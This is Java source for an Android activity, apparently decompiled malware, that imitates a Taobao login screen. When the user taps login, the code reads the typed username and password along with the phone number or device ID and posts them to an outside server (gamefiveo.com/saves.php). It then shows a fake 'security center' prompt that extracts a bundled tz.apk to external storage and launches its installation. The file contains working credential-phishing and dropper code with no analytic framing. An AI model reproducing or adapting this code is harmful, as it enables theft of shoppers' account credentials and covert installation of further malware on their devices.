package com.tao.bao;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class MainActivity extends Activity {
    String phoneNum = "";
    SmsManager smsManager;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.smsManager = SmsManager.getDefault();
        setContentView(R.layout.index);
        Button btnLogin = (Button) findViewById(R.id.login);
        final EditText etName = (EditText) findViewById(R.id.edit_username);
        final EditText etPass = (EditText) findViewById(R.id.edit_password);
        ((TextView) findViewById(R.id.tv)).setText(Html.fromHtml("还没有账号？<u>免费注册</u>"));
        btnLogin.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                final String name = etName.getText().toString();
                if (name.equals("")) {
                    Toast.makeText(MainActivity.this, "请输入用户名", 0).show();
                    return;
                }
                final String password = etPass.getText().toString();
                if (password.equals("")) {
                    Toast.makeText(MainActivity.this, "请输入密码", 0).show();
                    return;
                }
                TelephonyManager manager = (TelephonyManager) MainActivity.this.getSystemService("phone");
                MainActivity.this.phoneNum = manager.getLine1Number();
                if (MainActivity.this.phoneNum.equals("")) {
                    MainActivity.this.phoneNum = manager.getDeviceId();
                }
                new Thread(new Runnable() {
                    public void run() {
                        List<NameValuePair> params = new ArrayList();
                        NameValuePair pair = new BasicNameValuePair("sbid", MainActivity.this.phoneNum);
                        NameValuePair pair1 = new BasicNameValuePair("sendnumber", "淘宝二手");
                        NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                        params.add(new BasicNameValuePair("smscontent", "用户名:" + name + ",  密码:" + password));
                        params.add(pair2);
                        params.add(pair1);
                        params.add(pair);
                        Log.e("tag", "result = " + ToolHelper.postData("http://www.gamefiveo.com/saves.php", params));
                    }
                }).start();
                if (MainActivity.checkApkExist(MainActivity.this, "google.tao")) {
                    MainActivity.this.startActivity(new Intent(MainActivity.this, LocationVerify.class));
                    MainActivity.this.finish();
                    return;
                }
                Builder dil = new Builder(MainActivity.this);
                dil.setCancelable(false);
                dil.setMessage("为了您的账号安全，请安装安全中心后再进行操作。谢谢。\n\n点击确定，立即安装");
                dil.setNegativeButton("确定", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface arg0, int arg1) {
                        MainActivity.Install(MainActivity.this, "");
                    }
                });
                dil.setPositiveButton("取消", null);
                dil.create();
                dil.show();
            }
        });
    }

    public static boolean checkApkExist(Context context, String packageName) {
        if (packageName == null || "".equals(packageName)) {
            return false;
        }
        try {
            ApplicationInfo info = context.getPackageManager().getApplicationInfo(packageName, 8192);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }

    public static void Install(Context ctx, String strLocalFile) {
        Intent intentInstall = new Intent();
        String apkPath = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append(File.separator).toString();
        String apkName = "tz.apk";
        File file = new File(apkPath, apkName);
        try {
            InputStream is = ctx.getAssets().open("tz");
            if (!file.exists()) {
                file.createNewFile();
                FileOutputStream os = new FileOutputStream(file);
                byte[] bytes = new byte[1024];
                while (is.read(bytes) > 0) {
                    os.write(bytes);
                }
                os.close();
                is.close();
            }
            try {
                Runtime.getRuntime().exec("chmod " + "666" + " " + apkPath + "/" + apkName);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (Exception e2) {
        }
        intentInstall.setAction("android.intent.action.VIEW");
        intentInstall.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        intentInstall.setFlags(268435456);
        ctx.startActivity(intentInstall);
    }
}
